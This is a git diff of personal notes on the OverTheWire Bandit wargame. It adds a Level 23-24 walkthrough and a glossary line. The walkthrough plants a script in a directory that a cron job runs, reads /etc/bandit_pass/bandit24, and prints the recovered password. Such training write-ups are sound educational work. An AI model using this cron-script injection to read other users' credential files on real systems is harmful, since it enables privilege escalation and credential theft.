@@ -292,8 +292,50 @@ mytarget=$(echo I am user $myname | md5sum | cut -d ' ' -f 1)
 ```
 
 - Level 23-24:
-```bash
 
+```bash
+cd /etc/cron.d/
+ls
+# This file shows the cron job configuration for the bandit24 user:
+cat cronjob_bandit24
+# This script is run by the cron job and contains the logic that handles scripts in the /var/spool/bandit24/foo directory:
+cat /usr/bin/cronjob_bandit24.sh
+# the content inside this file:
+#!/bin/bash
+myname=$(whoami)
+cd /var/spool/$myname/foo
+echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
+for i in * .*; #The script loops through all files in the directory
+do
+    if [ "$i" != "." -a "$i" != ".." ]; #It ignores the . and .. entries
+    then
+        echo "Handling $i" #It prints a message for each file being handled.
+        owner="$(stat --format "%U" ./$i)" #It checks if the file is owned by bandit23
+        if [ "${owner}" = "bandit23" ]; then #If the file is owned by bandit23, it executes the file with a timeout of 60 seconds.
+            timeout -s 9 60 ./$i
+        fi
+        rm -f ./$i #Finally, it deletes the file.
+    fi
+done
+
+# This is a writable directory where you can create your script:
+cd /tmp/rand
+# Create an empty script file script.sh:
+touch script.sh
+# This command attempts to open the script file in the nano text editor for editing:
+nano script.sh
+touch password
+# the content of the script:
+#!/bin/bash
+cat /etc/bandit_pass/bandit24 > /tmp/rand/password
+
+# This ensures that the script and the password file can be accessed and modified as needed:
+chmod 777 -R /tmp/rand
+# This moves your script into the directory where the cron job will execute it:
+cp script.sh /var/spool/bandit24/foo
+ls -l
+cat password
+gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8
 ```
 
 # COMMANDS:
@@ -332,7 +374,8 @@ ncat: A versatile networking tool for reading from and writing to network connec
 diff: Compares files line by line and outputs the differences.
 screen: A terminal multiplexer that allows multiple shell sessions within a single terminal window.
 tmux: A terminal multiplexer that enables multiple terminal sessions to be accessed and controlled from a single screen.
-pwd: print working directory (see the current directory)
+pwd: print working directory (see the current directory).
+whatis: displays a brief description of a specified command or program.
 
 Unix ‘job control’:
 
@@ -340,5 +383,3 @@ Unix ‘job control’:
 - fg: Brings a background job to the foreground.
 - jobs: Lists active jobs.
 - &: Runs a command in the background.
-#   L i n u x - o v e r _ t h e _ w i r e _ b a n d i t  
- 
